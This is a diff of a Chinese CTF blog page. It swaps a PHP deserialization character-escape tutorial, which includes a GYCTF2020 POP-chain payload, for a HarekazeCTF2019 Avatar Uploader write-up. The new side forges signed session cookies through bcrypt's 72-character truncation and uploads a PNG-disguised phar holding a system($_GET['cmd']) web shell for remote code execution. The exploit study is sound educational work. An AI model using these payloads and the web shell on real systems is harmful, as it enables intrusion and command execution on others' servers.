@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="php反序列化字符逃逸漏洞, Fortheone">
+    <meta name="keywords" content="HarekazeCTF2019-Avatar Uploader, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php反序列化字符逃逸漏洞 | Fortheone</title>
+    <title>HarekazeCTF2019-Avatar Uploader | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php反序列化字符逃逸漏洞</h1>
+                    <h1 class="description center-align post-title">HarekazeCTF2019-Avatar Uploader</h1>
                 </div>
             </div>
         </div>
@@ -411,8 +411,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/CTF复现/" class="post-category">
-                                CTF复现
+                            <a href="/categories/CTF/" class="post-category">
+                                CTF
                             </a>
                         
                     </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-18
+                    2020-03-30
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.6k
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    6 分
                 </div>
                 
 
@@ -456,175 +456,204 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>php反序列化pop链构造在CTF中一直以来都是一个很重要的考点，有直接传参反序列化数据的，通过文件读取的phar协议触发反序列化的，通过mysql读取文件漏洞触发反序列化漏洞。</p>
-<p>反序列化字符逃逸是在反序列化时某字符被替换成其他字符，导致我们构造的恶意字符逃逸出正常的属性值中。一般看到替换某字符为另一种字符（如hacker）字符的长度发生了变化的，就会出现此漏洞。</p>
+                <h3 id="0x00-前言">0x00 前言</h3>
+<p>今天做了HarekazeCTF2019的两道Avatar Uploader，感觉非常有意思，于是在此记录一下。题目都是给了源码的，所以考验代码审计能力。</p>
+<h3 id="0x01-Avatar-Uploader1">0x01 Avatar Uploader1</h3>
+<p>第一题比较简单，主要考的是两个函数对文件判断的区别。</p>
 <pre><code>&lt;?php
-class Student{
-	public $age;
-	public $name;
+error_reporting(0);
+
+require_once('config.php');
+require_once('lib/util.php');
+require_once('lib/session.php');
+
+$session = new SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);
+
+// check whether file is uploaded
+if (!file_exists($_FILES['file']['tmp_name']) || !is_uploaded_file($_FILES['file']['tmp_name'])) {
+  error('No file was uploaded.');
 }
 
-$a = new Student;
-$a-&gt;age = 20;
-$a-&gt;name = &quot;Fortheone&quot;;
-
-echo(serialize($a));
-?&gt;
-
-O:7:&quot;Student&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:9:&quot;Fortheone&quot;;}
-</code></pre>
-<p>正常输出序列化数据的结果如上，但其实我们可以篡改序列化的数据，给其增加该类中不存在的属性，在反序列化后也会正常输出。</p>
-<pre><code>$str = 'O:7:&quot;Student&quot;:2:{s:1:&quot;a&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:9:&quot;Fortheone&quot;;}aaaaaa';
-var_dump(unserialize($str));
-
-object(Student)#2 (3) {
-  [&quot;age&quot;]=&gt;
-  NULL
-  [&quot;name&quot;]=&gt;
-  string(9) &quot;Fortheone&quot;
-  [&quot;a&quot;]=&gt;
-  string(4) &quot;test&quot;
+// check file size
+if ($_FILES['file']['size'] &gt; 256000) {
+  error('Uploaded file is too large.');
 }
+
+// check file type
+$finfo = finfo_open(FILEINFO_MIME_TYPE);
+$type = finfo_file($finfo, $_FILES['file']['tmp_name']);
+finfo_close($finfo);
+if (!in_array($type, ['image/png'])) {
+  error('Uploaded file is not PNG format.');
+}
+
+// check file width/height
+$size = getimagesize($_FILES['file']['tmp_name']);
+if ($size[0] &gt; 256 || $size[1] &gt; 256) {
+  error('Uploaded image is too large.');
+}
+if ($size[2] !== IMAGETYPE_PNG) {
+  // I hope this never happens...
+  error('What happened...? OK, the flag for part 1 is: &lt;code&gt;' . getenv('FLAG1') . '&lt;/code&gt;');
+}
+
+// ok
+$filename = bin2hex(random_bytes(4)) . '.png';
+move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_DIR . '/' . $filename);
+
+$session-&gt;set('avatar', $filename);
+flash('info', 'Your avatar has been successfully updated!');
+redirect('/');
 </code></pre>
-<p>我在序列化之后的数据篡改了age属性的键值对，使其变为a=&gt;test，但php反序列化后还是将它添加到了Student的属性之中。</p>
-<p>并且反序列化时是以}来作为结束符，反序列化会截断掉}后的数据。</p>
-<p>可能看完了这两个例子以后，还是无法想到有什么可利用的漏洞点，但是如果在反序列化之前进行了字符替换的操作，看看会发生什么。</p>
+<p>看一遍代码可以发现奇怪的地方，在对上传的文件进行类型判别的时候，第一次使用的是finfo_open，第二次使用的是getimagesize。而我们要拿到flag的条件是第一次被判定为png图片，第二次被判定不是png类型。所以问题就在于这两个函数的差异判断。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200330214326.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200330214038.png" alt></p>
+<p>可以看到，finfo_file可以识别这个图片文件，但是getimagesize不行，所以上传这个文件就可以了。</p>
+<h3 id="0x02-Avatar-Uploader2">0x02 Avatar Uploader2</h3>
+<p>比较有意思的是这个第二题，首先题目自定义了个session相关的类</p>
 <pre><code>&lt;?php
-class Student{
-	public $age;
-	public $test;
-	public $name;
-}
-#字符过滤操作
-function safe($parm){
-    $array= array('union','regexp','load','into','flag','file','insert',&quot;'&quot;,'\\',&quot;*&quot;,&quot;alter&quot;);
-    return str_replace($array,'hacker',$parm);
-}
+class SecureClientSession {
+  private $cookieName;
+  private $secret;
+  private $data;
 
-$a = new Student;
-$a-&gt;age = 20;
-$a-&gt;name = &quot;Fortheone&quot;;
+  public function __construct($cookieName = 'session', $secret = 'secret') {
+    $this-&gt;data = [];
+    $this-&gt;secret = $secret;
 
+    if (array_key_exists($cookieName, $_COOKIE)) {
+      try {
+        list($data, $signature) = explode('.', $_COOKIE[$cookieName]);
+        $data = urlsafe_base64_decode($data);
+        $signature = urlsafe_base64_decode($signature);
+    
+        if ($this-&gt;verify($data, $signature)) {
+          $this-&gt;data = json_decode($data, true);
+        }
+      } catch (Exception $e) {}
+    }
+  
+    $this-&gt;cookieName = $cookieName;
+  }
 
-#恶意payload
-$payload= '&quot;;s:4:&quot;name&quot;;s:12:&quot;yiyangqianxi&quot;;}';
-$len = strlen($payload);
-$payload1 = str_repeat('union',$len).$payload;
+  public function isset($key) {
+    return array_key_exists($key, $this-&gt;data);
+  }
 
-$a-&gt;test = $payload1;
-$b=serialize($a);
-print_r(&quot;before safe\n&quot;);
-var_dump(unserialize($b));
+  public function get($key, $defaultValue = null){
+    if (!$this-&gt;isset($key)) {
+      return $defaultValue;
+    }
 
+    return $this-&gt;data[$key];
+  }
 
-$c=safe($b);
-print_r(&quot;after safe\n&quot;);
-var_dump(unserialize($c));
+  public function set($key, $value){
+    $this-&gt;data[$key] = $value;
+  }
 
-before safe
-object(Student)#2 (3) {
-  [&quot;age&quot;]=&gt;
-  int(20)
-  [&quot;test&quot;]=&gt;
-  string(204) &quot;unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:4:&quot;name&quot;;s:12:&quot;yiyangqianxi&quot;;}&quot;
-  [&quot;name&quot;]=&gt;
-  string(9) &quot;Fortheone&quot;
-}
+  public function unset($key) {
+    unset($this-&gt;data[$key]);
+  }
 
-after safe
+  public function save() {
+    $json = json_encode($this-&gt;data);
+    $value = urlsafe_base64_encode($json) . '.' . urlsafe_base64_encode($this-&gt;sign($json));
+    setcookie($this-&gt;cookieName, $value);
+  }
 
-object(Student)#2 (3) {
-  [&quot;age&quot;]=&gt;
-  int(20)
-  [&quot;test&quot;]=&gt;
-  string(204) &quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;
-  [&quot;name&quot;]=&gt;
-  string(12) &quot;yiyangqianxi&quot;
+  private function verify($string, $signature) {
+    return password_verify($this-&gt;secret . $string, $signature);
+  }
+
+  private function sign($string) {
+    return password_hash($this-&gt;secret . $string, PASSWORD_BCRYPT);
+  }
 }
 </code></pre>
-<p>可以看到在safe操作之前的test中的payload逃逸出来，覆盖了原本的name值，而原本的name值被}截断了，所以导致修改了name值。而漏洞就在于union字符串的长度为5，而hacker字符串的长度为6，因为test规定了其键值的长度是204，每替换一个字符串就会多出一个长度，这里一共替换了34个union，所以多出了34个长度。之后的恶意payload就顺理成章的变成了student中的name属性。</p>
-<h4 id="GYCTF2020-Easyphp">GYCTF2020 Easyphp</h4>
-<p>题目中泄露了www.zip文件，做审计，先定位得到flag的方式。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584534654844.png" alt></p>
-<p>在update.php下要求我们 $_SESSION[‘login’]==1即可获得flag，那么就去找满足该条件的操作。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day3/1584534750924.png" alt></p>
-<p>在User类中的login方法中可以看到要完成该条件需要输入正确的密码，而查询的语句是由dbCtrl类的login方法操作的，再跟进去</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584534882068.png" alt></p>
-<p>成功返回id的条件是 1、token==‘admin’ 2、密码正确 所以不论如何我们都得知道密码，或者是修改数据库中查询出的password和我们传入的相同。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584535154816.png" alt></p>
-<p>看到开头所定义的字符替换方法，我们就知道这是反序列化逃逸的漏洞，那么我们就得找到一条反序列化pop链。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584535393239.png" alt></p>
-<p>看到Info类里有个__call方法，这种魔术方法一般都是有用的，还调用了一个login方法，和我们要利用的dbCtrl类中的方法重名，就可以把CtrlCase赋值为dbCtrl类，来执行它的login方法。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584535527726.png" alt></p>
-<p>找到User类中的toString方法，其中nickname可控，那么只要将nickname赋值为 Info类，调用了一个不存在的update方法，就能调用Info的 call方法，传入的age可控，也就是dbCtrl类的login方法中的sql可控，我们可以执行自己定义的sql语句了。 所以现在就要找到一处可触发User类toString方法的地方。</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584536167357.png" alt></p>
-<p>看到 UpdateHelper类中有echo，且sql参数可控，将其设为User类即可。</p>
-<p>那么整个pop链就清晰了</p>
-<p><code>UpdateHelper-&gt;__destruct -&gt;User-&gt;__toString -&gt;Info-&gt;__call -&gt;dbCtrl-&gt;login</code></p>
-<p>那么我们要执行什么sql语句呢？</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584536481022.png" alt></p>
-<p>整个代码流程就是获取我们输入的账号，然后查询该账号的id和密码，然后将查询到的密码和我们输入的密码比对，如果相同即可成功登录。这里存在一个问题，就是查询的语句是</p>
-<p><code>select id,password from user where username=?</code></p>
-<p>然后将结果对应到</p>
-<p><code>$result-&gt;bind_result($idResult, $passwordResult);</code></p>
-<p>然后会输出 $idResult</p>
-<p>这里如果我们将sql语句换成</p>
-<p><code>select password,id from user where username=?</code></p>
-<p>那输出的$idResult是不是就是password了。</p>
-<p>所以最终构造的pop链</p>
+<p>这里的cookie值是在save函数中定义的</p>
+<p>将传入的data转成json类型，然后value值分为两部分</p>
+<p>第一部分是 明文的json转为base64类型</p>
+<p>第二部分是 明文的json经过sign函数加密再转为base64类型</p>
+<p>我们登录题目 解密一下它给的cookie</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200330220318.png" alt></p>
+<p>后面的是一串看不懂的字符，不过没关系，我们看看它的加密方法</p>
+<pre><code>  private function sign($string) {
+    return password_hash($this-&gt;secret . $string, PASSWORD_BCRYPT);
+  }
+</code></pre>
+<p>传入的string经过 password_hash处理，而这个password_hash有一个问题，就是只能处理72个字符，多余的会忽略掉。</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200330220539.png" alt></p>
+<p>也就是说如果当前session的字符超过了72个，那么它后面无论添加什么，加密出来的字符都是一样的。说这个有什么意义呢？</p>
+<p>session中定义了一个verify函数，并且在__construct函数中用到</p>
+<pre><code>  private function verify($string, $signature) {
+    return password_verify($this-&gt;secret . $string, $signature);
+  }
+
+public function __construct($cookieName = 'session', $secret = 'secret') {
+    $this-&gt;data = [];
+    $this-&gt;secret = $secret;
+
+    if (array_key_exists($cookieName, $_COOKIE)) {
+      try {
+        list($data, $signature) = explode('.', $_COOKIE[$cookieName]);
+        $data = urlsafe_base64_decode($data);
+        $signature = urlsafe_base64_decode($signature);
+    
+        if ($this-&gt;verify($data, $signature)) {
+          $this-&gt;data = json_decode($data, true);
+        }
+      } catch (Exception $e) {}
+    }
+</code></pre>
+<p>构造函数的意思就是，将我们的cookie拿出来，通过.分割为两部分，再进行base64解码</p>
+<p>然后再判断 明文data和经过加密的值是否匹配。</p>
+<p>所以如果我们第一次构造出一个超过72字符的明文data，我们无论加什么字符再后面把它拼回去，都能和经过加密的值匹配上。</p>
+<p>那这又有什么用呢？</p>
+<pre><code>&lt;html lang=&quot;en&quot;&gt;
+  &lt;head&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+    &lt;title&gt;Avatar Uploader&lt;/title&gt;
+    &lt;style&gt;
+/* common.css */
+&lt;?php include('common.css'); ?&gt;
+/* light/dark.css */
+&lt;?php include($session-&gt;get('theme', 'light') . '.css'); ?&gt;
+/**/
+</code></pre>
+<p>在index.php中有一个include包含文件，既然有拼接，就会有漏洞存在，我们跟进session的get方法看看。</p>
+<pre><code>  public function get($key, $defaultValue = null){
+    if (!$this-&gt;isset($key)) {
+      return $defaultValue;
+    }
+
+    return $this-&gt;data[$key];
+  }
+</code></pre>
+<p>传入的key是 theme ，那么也就是说如果我们控制了 data[‘theme’] 就可以控制任意文件包含。刚好我们可以上传文件，我们可以上传一个phar文件包含一个插有恶意代码的css文件。就可以实现rce。</p>
+<p>data就是我们的session明文部分，只要我们先让服务器生成一个大于72个字符的session，记录下此时的加密部分，然后在session明文部分的最后加上我们的theme=&gt;上传的文件名。就可以过掉验证，实现文件包含。</p>
+<p>来构造一个phar文件</p>
 <pre><code>&lt;?php
-class dbCtrl
-{
-    public $hostname=&quot;127.0.0.1&quot;;
-    public $dbuser=&quot;root&quot;;
-    public $dbpass=&quot;root&quot;;
-    public $database=&quot;test&quot;;
-    public $name=&quot;admin&quot;;
-    public $password;
-    public $mysqli;
-    public $token=&quot;admin&quot;;
-}
-class User
-{
-    public $id;
-    public $age=&quot;select password,id from user where username=?&quot;;
-    public $nickname;
-}
-
-Class UpdateHelper{
-    public $id;
-    public $newinfo;
-    public $sql;
-}
-
-class Info{
-    public $age;
-    public $nickname;
-    public $CtrlCase;
-}
-
-
-
-
-$a = new UpdateHelper();
-$a-&gt;sql=new User();
-$a-&gt;sql-&gt;nickname=new Info();
-$a-&gt;sql-&gt;nickname-&gt;CtrlCase=new dbCtrl();
+$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');
+$phar = new Phar('exp.phar');
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString('exp.css', '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;');
+$phar-&gt;setStub($png_header . '&lt;?php __HALT_COMPILER(); ?&gt;');
+$phar-&gt;stopBuffering();
 </code></pre>
-<p>构造完了，嗯？反序列化触发点呢？？？？</p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584537190831.png" alt></p>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584537275809.png" alt></p>
-<p>刚好这里有safe操作，所以就把payload传到nickname里。</p>
-<pre><code>$payload = '&quot;;s:1:&quot;a&quot;;'.serialize($a).&quot;}&quot;;
-$len = strlen($payload);
-$d = str_repeat(&quot;union&quot;, $len).$payload;
-echo($d);
+<p>上传上去并记录下此时的session</p>
+<pre><code>eyJuYW1lIjoiYWRtaW4iLCJhdmF0YXIiOiIwZjIyYWRhOS5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3NhZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifX0.JDJ5JDEwJG9YVVF1Ny9TeUtQZ3JDLmJMdXpFOWVEcE5pdW9zb1NoVS9OUFdLWHZqam9QcXBvQzM4TjdX
 
-unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion&quot;;s:1:&quot;a&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;N;s:8:&quot;nickname&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}}
+{&quot;name&quot;:&quot;admin&quot;,&quot;avatar&quot;:&quot;0f22ada9.png&quot;,&quot;flash&quot;:{&quot;type&quot;:&quot;info&quot;,&quot;message&quot;:&quot;Your avatar has been successfully updated!&quot;}}	�IL	�T]M���R�ܐ˘�^�NYQ�][����KӔ������\����
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/1584537626107.png" alt></p>
-<p>在update.php页面传入payload即可得到admin的密码，解密是 glzjin</p>
-<p>登录即可getflag</p>
+<p>这里也返回了上传的文件的名字。这里可以看到session明文肯定大于72个字符了</p>
+<p>再构造一个session,将它base64编码以后和第一次的密文拼接</p>
+<pre><code>{&quot;name&quot;:&quot;admin&quot;,&quot;avatar&quot;:&quot;0f22ada9.png&quot;,&quot;flash&quot;:{&quot;type&quot;:&quot;info&quot;,&quot;message&quot;:&quot;Your avatar has been successfully updated!&quot;},&quot;theme&quot;:&quot;phar://uploads/0f22ada9.png/exp&quot;}
+
+eyJuYW1lIjoiYWRtaW4iLCJhdmF0YXIiOiIwZjIyYWRhOS5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3NhZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifSwidGhlbWUiOiJwaGFyOi8vdXBsb2Fkcy8wZjIyYWRhOS5wbmcvZXhwIn0.JDJ5JDEwJG9YVVF1Ny9TeUtQZ3JDLmJMdXpFOWVEcE5pdW9zb1NoVS9OUFdLWHZqam9QcXBvQzM4TjdX
+</code></pre>
+<p>带上这个cookie就可以命令执行了</p>
+<p><img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/day4/20200330222810.png" alt></p>
 
             </div>
             <hr>
@@ -650,7 +679,7 @@ unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/03/18/php反序列化字符逃逸/">http://yoursite.com/year/03/18/php反序列化字符逃逸/</a>
+                    <a href="http://yoursite.com/year/03/30/HarekazeCTF2019/">http://yoursite.com/year/03/30/HarekazeCTF2019/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1116,43 +1145,44 @@ unionunionunionunionunionunionunionunionunionunionunionunionunionunionunionunion
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/03/20/脚本记录/">
+                <a href="/year/03/30/HarekazeCTF2019/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="CTF脚本记录（持续更新）">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="HarekazeCTF2019-Avatar Uploader">
                         
-                        <span class="card-title">CTF脚本记录（持续更新）</span>
+                        <span class="card-title">HarekazeCTF2019-Avatar Uploader</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            每次做sql注入的题目都要自己重写一遍脚本很麻烦，其实写好框架换payload就可以了，在此记录一些可以套的模板
-sql注入二分法：
-import requests
-s = requests.session()
-url = "http://
+                            0x00 前言
+今天做了HarekazeCTF2019的两道Avatar Uploader，感觉非常有意思，于是在此记录一下。题目都是给了源码的，所以考验代码审计能力。
+0x01 Avatar Uploader1
+第一题比较简单，主要考的是
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-20
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/总结记录/" class="post-category">
-                                    总结记录
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1163,29 +1193,28 @@ url = "http://
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/03/16/做题记录0316/">
+                <a href="/year/03/29/刷题记录/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="做题记录——网鼎杯2018comment">
+                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="刷题记录0319">
                         
-                        <span class="card-title">做题记录——网鼎杯2018comment</span>
+                        <span class="card-title">刷题记录0319</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            这道题目还是蛮有意思的，至少丰富了自己的一部分还不太懂的知识点。
-今天扫描器不知道怎么抽风了，题目的git泄露都扫不到，很怪，被迫换字典。
-
-开局是一个留言板，选择发帖要登录
-
-这里提示账号是 zhangwei  密码是 zhangwei*
+                            易博霖比赛 web1
+这比赛几乎都是原题改的，难度低，web分数不吃香，最后只拿了第七。
+web1和code-breaking的原题差不多，加了个过滤，不过用session可以直接rce
+&lt;?php
+if(isset($_GET['v
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-29
                             </span>
                         <span class="publish-author">
                             
